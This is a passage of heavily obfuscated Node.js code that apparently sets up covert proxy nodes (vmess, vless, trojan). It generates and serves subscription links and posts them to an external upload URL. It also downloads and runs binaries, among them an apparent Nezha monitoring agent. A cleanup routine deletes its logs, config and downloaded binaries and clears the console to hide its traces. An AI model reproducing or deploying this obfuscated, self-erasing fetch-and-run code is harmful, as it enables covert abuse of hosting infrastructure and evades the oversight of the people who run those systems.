axios[_0x50bd1b(_0x1103c5._0x36f629)](_0x50bd1b(0x1e0),{'timeout':0xbb8});if(_0x24792e[_0x50bd1b(0x1e9)]&&_0x24792e[_0x50bd1b(_0x1103c5._0x3c3039)][_0x50bd1b(0x26f)]===_0x50bd1b(0x22e)&&_0x24792e[_0x50bd1b(_0x1103c5._0x3c3039)][_0x50bd1b(_0x1103c5._0x3d8b73)]&&_0x24792e[_0x50bd1b(_0x1103c5._0x3c3039)][_0x50bd1b(_0x1103c5._0x43cac9)])return _0x24792e['data']['countryCode']+'_'+_0x24792e['data'][_0x50bd1b(_0x1103c5._0x419fda)];}catch(_0x359c07){}}return _0x50bd1b(_0x1103c5._0x2c7621);}async function _0x169e34(_0xf90959){const _0x57a5e1={_0x5e966e:0x1f8,_0x4b023:0x231,_0x39f469:0x29e,_0x4246b3:0x225,_0x4ed656:0x20a,_0x38ab85:0x27e,_0x3b7875:0x1f9,_0x3924fa:0x28d},_0x45de5c=await _0x134205(),_0x314f0d=NAME?NAME+'-'+_0x45de5c:_0x45de5c;return new Promise(_0x3813fa=>{const _0x28b387={_0x1e8885:0x27e,_0x10682a:0x1e3,_0x409bad:0x288};setTimeout(()=>{const _0x43ce85=_0x48c0,_0x544a90={'v':'2','ps':''+_0x314f0d,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x43ce85(0x222),'net':'ws','type':'none','host':_0xf90959,'path':_0x43ce85(0x211),'tls':'tls','sni':_0xf90959,'alpn':'','fp':'firefox'},_0x1f84c7=_0x43ce85(0x27b)+UUID+'@'+CFIP+':'+CFPORT+_0x43ce85(0x266)+_0xf90959+_0x43ce85(0x289)+_0xf90959+_0x43ce85(_0x57a5e1._0x5e966e)+_0x314f0d+_0x43ce85(_0x57a5e1._0x4b023)+Buffer[_0x43ce85(_0x57a5e1._0x39f469)](JSON['stringify'](_0x544a90))['toString'](_0x43ce85(0x1f9))+_0x43ce85(_0x57a5e1._0x4246b3)+UUID+'@'+CFIP+':'+CFPORT+_0x43ce85(0x1f6)+_0xf90959+_0x43ce85(0x289)+_0xf90959+_0x43ce85(0x2a3)+_0x314f0d+_0x43ce85(0x1f1);console[_0x43ce85(_0x57a5e1._0x4ed656)](Buffer[_0x43ce85(0x29e)](_0x1f84c7)[_0x43ce85(_0x57a5e1._0x38ab85)](_0x43ce85(0x1f9))),fs['writeFileSync'](subPath,Buffer[_0x43ce85(_0x57a5e1._0x39f469)](_0x1f84c7)[_0x43ce85(0x27e)](_0x43ce85(_0x57a5e1._0x3b7875))),console[_0x43ce85(0x20a)](FILE_PATH+_0x43ce85(0x298)),uploadNodes(),app[_0x43ce85(_0x57a5e1._0x3924fa)]('/'+SUB_PATH,(_0x32e9e7,_0xf34e35)=>{const _0x577670=_0x43ce85,_0x2116d2=Buffer['from'](_0x1f84c7)[_0x577670(_0x28b387._0x1e8885)]('base64');_0xf34e35[_0x577670(_0x28b387._0x10682a)]('Content-Type',_0x577670(0x203)),_0xf34e35[_0x577670(_0x28b387._0x409bad)](_0x2116d2);}),_0x3813fa(_0x1f84c7);},0x7d0);});}}async function uploadNodes(){const _0x5466a7={_0x569822:0x24c,_0x26abbf:0x22f,_0x11f2cc:0x26f,_0x2c6519:0x254,_0xde5444:0x276},_0x65b1e5=_0x307b38;if(UPLOAD_URL&&PROJECT_URL){const _0xb3a225=PROJECT_URL+'/'+SUB_PATH,_0x4af3cf={'subscription':[_0xb3a225]};try{const _0x38254a=await axios[_0x65b1e5(_0x5466a7._0x569822)](UPLOAD_URL+'/api/add-subscriptions',_0x4af3cf,{'headers':{'Content-Type':'application/json'}});return _0x38254a&&_0x38254a[_0x65b1e5(0x26f)]===0xc8?(console[_0x65b1e5(0x20a)]('Subscription\x20uploaded\x20successfully'),_0x38254a):null;}catch(_0x56bd29){if(_0x56bd29[_0x65b1e5(_0x5466a7._0x26abbf)]){if(_0x56bd29[_0x65b1e5(0x22f)][_0x65b1e5(_0x5466a7._0x11f2cc)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x148592=fs[_0x65b1e5(0x1ed)](listPath,'utf-8'),_0x1d596d=_0x148592[_0x65b1e5(0x24b)]('\x0a')[_0x65b1e5(_0x5466a7._0x2c6519)](_0x5c71b4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x65b1e5(0x28e)](_0x5c71b4));if(_0x1d596d[_0x65b1e5(0x214)]===0x0)return;const _0x37c9cc=JSON[_0x65b1e5(0x278)]({'nodes':_0x1d596d});try{const _0xf51027=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x37c9cc,{'headers':{'Content-Type':'application/json'}});return _0xf51027&&_0xf51027[_0x65b1e5(0x26f)]===0xc8?(console[_0x65b1e5(0x20a)](_0x65b1e5(_0x5466a7._0xde5444)),_0xf51027):null;}catch(_0x2f9823){return null;}}else return;}}function cleanFiles(){const _0x27880e={_0x491546:0x26c,_0x1baec9:0x234},_0x3b8465={_0x2f3433:0x26e,_0x289585:0x20a};setTimeout(()=>{const _0x443d50={_0x4777de:0x20a,_0x39fd09:0x204},_0x8b7461=_0x48c0,_0x19269c=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x19269c['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x19269c[_0x8b7461(0x21a)](phpPath);process['platform']==='win32'?exec(_0x8b7461(0x1e1)+_0x19269c['join']('\x20')+'\x20>\x20nul\x202>&1',_0x56f7cc=>{const _0x3fb83d=_0x8b7461;console['clear'](),console[_0x3fb83d(_0x443d50._0x4777de)](_0x3fb83d(0x239)),console[_0x3fb83d(_0x443d50._0x4777de)](_0x3fb83d(_0x443d50._0x39fd09));}):exec(_0x8b7461(_0x27880e._0x491546)+_0x19269c[_0x8b7461(0x279)]('\x20')+_0x8b7461(_0x27880e._0x1baec9),_0x4ce646=>{const _0x3c0f36=_0x8b7461;console[_0x3c0f36(_0x3b8465._0x2f3433)](),console[_0x3c0f36(0x20a)]('App\x20is\x20running'),console[_0x3c0f36(_0x3b8465._0x289585)](_0x3c0f36(0x204));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x51660c={_0x1f5fca:0x24c,_0x49c053:0x1ea},_0x43f784=_0x307b38;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x43f784(0x20a)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x24d8dd=await axios[_0x43f784(_0x51660c._0x1f5fca)](_0x43f784(0x274),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x43f784(0x212)}});return console[_0x43f784(0x20a)]('automatic\x20access\x20task\x20added\x20successfully'),_0x24d8dd;}catch(_0x4586b3){return console[_0x43f784(0x20e)](_0x43f784(_0x51660c._0x49c053)+_0x4586b3[_0x43f784(0x257)]),null;}}async function startserver(){const _0x67123d=_0x307b38;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1a7569){console[_0x67123d(0x20e)](_0x67123d(0x1eb),_0x1a7569);}}startserver()[_0x307b38(0x21e)](_0x356ea9=>{const _0x87d4b2={_0x586ab4:0x24f},_0x50c4f3=_0x307b38;console['error'](_0x50c4f3(_0x87d4b2._0x586ab4),_0x356ea9);}),app[_0x307b38(0x1e6)](PORT,()=>console[_0x307b38(0x20a)](_0x307b38(0x20f)+PORT+'!'));
